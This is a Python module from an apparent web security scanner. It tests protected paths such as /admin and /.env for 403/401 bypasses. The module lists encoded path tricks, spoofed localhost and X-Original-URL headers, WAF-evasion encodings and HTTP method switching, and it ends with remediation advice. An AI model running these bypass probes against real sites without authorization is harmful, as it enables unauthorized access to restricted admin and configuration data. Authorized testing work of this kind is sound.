"""
bypass_403_scanner.py — 403/401 Bypass Scanner
================================================
Attempts to bypass access-denied responses using URL encoding tricks,
path normalization, header manipulation, and method switching.
"""
import urllib.parse
from scanners.base_scanner import BaseScanner
from utils.evasion import waf_evade
from utils.callback import build_callback_url

PROTECTED_PATHS = [
    "/admin", "/admin/", "/dashboard", "/config", "/secret",
    "/api/admin", "/internal", "/private", "/backup",
    "/management", "/.env", "/server-status",
]


class Bypass403Scanner(BaseScanner):
    SCANNER_NAME = "403/401 Bypass Scanner"
    _SCANNER_KEY = "bypass_403"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[403Bypass] Testing access control bypass techniques on {self.target}...")
        base = self.target.rstrip("/")

        for path in PROTECTED_PATHS:
            baseline_status = self._get_status(base + path)
            if baseline_status not in (401, 403):
                continue

            self.log("INFO", f"[403Bypass] Found protected path: {path} (HTTP {baseline_status})")
            self._try_bypasses(base, path, baseline_status)

        if not self.vulns:
            self.log("SUCCESS", "[403Bypass] No 403/401 bypass vectors found.")
        return self.vulns

    def _try_bypasses(self, base, path, original_status):
        bypasses = []

        path_variants = [
            path + "/",
            path + "/.",
            "/" + path.lstrip("/").replace("/", "//"),
            path.replace("/", "/%2f"),
            path.replace("/", "/./"),
            "/." + path,
            path + "%20",
            path + "%09",
            path + "..;/",
            path + "/*",
            path + "?.js",
            path + ".json",
            path + "/%2e/",
            path.upper(),
            path.lower().replace("/admin", "/Admin"),
            path.replace("/", "/%2f/"),
            path + "?x=1",
            path + "#",
            "/.." + path,
            "/%2e%2e" + path,
            path + "/..",
            "/%23" + path,
            "/%00" + path,
            path.replace("/", "/%00/"),
            path + ".html",
            path + "/%20",
            path + ";/",
            path + "%252f",
            "//" + path.lstrip("/"),
            "/" + path.lstrip("/").replace("/", "/%20/"),
            path.replace("/", "/%09/"),
        ]
        for variant in path_variants:
            s = self._get_status(base + variant)
            if s not in (401, 403, 404, 0):
                bypasses.append({"method": f"Path variant: `{variant}`", "status": s})
            for enc_name, enc_val in waf_evade(variant):
                s2 = self._get_status(base + enc_val)
                if s2 not in (401, 403, 404, 0):
                    bypasses.append({"method": f"Path variant (WAF evade): `{enc_val}`", "status": s2})

        callback_url = build_callback_url("/403-bypass")
        header_tricks = [
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Forwarded-For": "localhost"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": path, "X-Forwarded-For": "127.0.0.1"},
            {"X-Rewrite-URL": path, "X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": callback_url},
            {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            {"X-Forwarded-For": "2130706433"},
            {"X-Forwarded-For": "0x7f000001"},
            {"X-Original-URL": path, "X-Forwarded-For": "10.0.0.1"},
            {"X-Rewrite-URL": path, "X-Forwarded-Host": "localhost"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-HTTP-Method": "GET"},
            {"X-Method-Override": "GET"},
        ]
        for hdrs in header_tricks:
            s = self._get_status(base + "/", extra_headers=hdrs)
            if s not in (401, 403, 404, 0):
                header_key = list(hdrs.keys())[0]
                header_val = list(hdrs.values())[0]
                bypasses.append({"method": f"Header: `{header_key}: {header_val}`", "status": s})
            for header_name in hdrs:
                for enc_name, enc_val in waf_evade(header_name):
                    waf_hdrs = {enc_val: hdrs[header_name]}
                    s2 = self._get_status(base + "/", extra_headers=waf_hdrs)
                    if s2 not in (401, 403, 404, 0):
                        bypasses.append({"method": f"Header (WAF evade): `{enc_val}: {hdrs[header_name]}`", "status": s2})

        for method in ["POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "PROPFIND", "MOVE", "COPY", "MKCOL"]:
            s = self._get_status(base + path, method=method)
            if s not in (401, 403, 404, 0):
                bypasses.append({"method": f"HTTP method: `{method}`", "status": s})

        if bypasses:
            self.add_vuln(
                title=f"403/401 Access Control Bypass on `{path}`",
                severity="High",
                category="Access Control Bypass",
                cvss_score=7.5,
                description=f"Path `{path}` returned HTTP {original_status} normally, but the "
                    f"following techniques bypassed the restriction:\n\n" +
                    "\n".join(f"- {b['method']} → HTTP **{b['status']}**" for b in bypasses[:20]),
                remediation="1. Implement access control at the application layer, not just the URL.\n"
                    "2. Normalize URLs before access control checks (strip ../, %2f, trailing dots).\n"
                    "3. Reject X-Original-URL and X-Rewrite-URL headers at the reverse proxy.\n"
                    "4. Never trust X-Forwarded-For or Client-IP for authorization decisions.",
                evidence="\n".join(f"{b['method']} → {b['status']}" for b in bypasses[:20]),
                confidence="High",
                cwe_ids=["CWE-290"],
                owasp_category="A01:2021 – Broken Access Control",
            )
            self.log("CRITICAL", f"[403Bypass] {len(bypasses)} bypass(es) found for {path}!")

    def _get_status(self, url, method="GET", extra_headers=None):
        headers = {}
        if extra_headers:
            headers.update(extra_headers)
        body, status = self._make_request(url, method=method, headers=headers if headers else None)
        return status
